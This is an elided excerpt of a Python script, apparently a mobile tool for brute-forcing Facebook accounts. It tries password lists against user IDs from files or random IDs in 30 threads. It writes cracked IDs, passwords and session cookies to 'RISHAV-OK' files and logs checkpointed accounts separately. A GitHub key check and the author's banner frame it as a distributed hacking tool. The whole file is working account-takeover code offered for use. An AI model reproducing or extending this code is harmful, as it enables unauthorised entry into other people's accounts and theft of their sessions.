...
#!usr/lib/python3.11
#OPEN SOURCE BY JUTT
print(" Open source by RISHAV HERO")
##------------------[ INSTALL-MENU ]------------------##
import uuid
import os,sys,time
...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mRISHAV-HERO\33[1;91m⊁ ')
...
try:
	prox= requests.get('https://github.com/RISHAV-XD/Rishav-Hero/blob/main/Rishav.txt').text
...
░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▐░  
  ...
  ░░   ░  ▒ ░░  ░  ░   ░  ░░ ░  ░   ▒     ░░  
   ░      ░        ░   ░  ░  ░      ░  ░   ░  
                                          ░   
\033[1;34m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \036[1;36mOWNER   :  RISHAV DULAL
 [<>] \033[1;32mNUMBER :  98********
 [<>] \035[1;34mGITHUB  :  RISHAV-GITHUB
 [<>] \033[1;35mSTATUS  :    TRYL
 [<>] \034[1;31mTOOLS   :    FILE X RANDOM
...
class apvroval:
    def check():
        url = "https://github.com/RISHAV-XD/Rishav-Hero/blob/main/Rishav.txt"
        import mechanize
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                os.system('xdg-open https://wa.me/+9849218796 ')
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/RISHAV-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/RISHAV-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[RISHAV>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[RISHAV-OK😻] {ids} | {pas}')
                open('/sdcard/RISHAV-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/RISHAV-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[RISHAV>RNDM😻] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[RISHAV😻-OK] {uid} | {pas}')
                open('/sdcard/RISHAV😻-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
